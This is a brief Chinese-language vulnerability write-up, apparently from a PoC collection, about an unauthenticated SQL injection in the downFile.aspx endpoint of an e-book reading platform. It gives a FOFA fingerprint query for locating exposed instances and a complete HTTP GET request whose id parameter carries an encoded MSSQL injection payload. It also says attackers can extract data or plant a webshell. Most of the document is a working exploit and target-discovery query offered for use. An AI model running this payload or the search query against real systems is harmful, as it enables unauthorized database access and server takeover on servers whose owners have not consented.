# 电子图书阅读平台downFile.aspx存在SQL注入漏洞

电子图书阅读平台 downFile.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```javascript
body="/Index.aspx/SearchBy"
```

## poc

```javascript
GET /web/downFile.aspx?id=%27%2B%28SELECT+CHAR%2867%29%2BCHAR%2885%29%2BCHAR%2886%29%2BCHAR%2879%29+WHERE+1651%3D1651+AND+7828+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287828%3D7828%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%29%2B%27 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20241211211738168](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412112117238.png)